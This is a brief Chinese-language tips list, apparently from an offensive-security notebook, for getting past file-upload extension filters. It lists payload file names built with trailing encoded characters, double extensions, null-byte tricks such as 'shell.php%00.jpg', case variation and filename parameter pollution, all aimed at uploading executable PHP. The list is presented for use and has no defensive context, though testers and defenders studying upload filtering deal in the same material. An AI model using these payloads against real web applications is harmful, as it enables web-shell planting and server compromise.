## 2026-10 情报批增量（限额/后缀过滤绕过 tips）

@n0aziXss 2026-02 系列，按后缀变体轮试：
```
1. 扩展名尾部特殊字符：file.php%20 / file.php%0a / file.php%00 / file.php%0d%0a / file.php/ / file.php.\ / file. / file.php…. / file.pHp5….
2. 双后缀：file.png.php / file.png.pHp5
3. null byte + 垃圾串：shell.php%00.jpg / shell.php%0delete0.jpg / file.phpJunk123png
4. 大小写：file.jPg / file.SvG / file.asP
5. 文件名 HPP：filename=1.jpg&filename=.php
```


---

